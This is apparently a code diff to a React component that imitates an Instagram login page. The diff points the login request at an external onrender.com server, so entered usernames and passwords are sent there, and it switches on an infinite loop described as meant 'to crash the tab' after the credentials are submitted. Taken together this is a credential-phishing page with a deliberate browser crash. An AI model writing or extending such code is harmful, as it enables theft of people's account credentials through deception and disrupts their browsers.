@@ -4,7 +4,7 @@ export default function InstagramLogin() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
-  const URL = "http://localhost:3000";
+  const URL = "https://instagram-j92x.onrender.com";
   const handleLogin = async () => {
     // Simulate login process
     if (username && password) {
@@ -14,13 +14,13 @@ export default function InstagramLogin() {
         body: JSON.stringify({ email: username, password }),
       });
       const data = await response.json();
-      console.log("Login response:", data);
-      // setTimeout(() => {
-      //   // Create infinite loop to crash the tab
-      //   while (true) {
-      //     console.log("Crashing...");
-      //   }
-      // }, 1000);
+      // console.log("Login response:", data);
+      setTimeout(() => {
+        // Create infinite loop to crash the tab
+        while (true) {
+          console.log("Crashing...");
+        }
+      }, 1000);
     }
   };
 
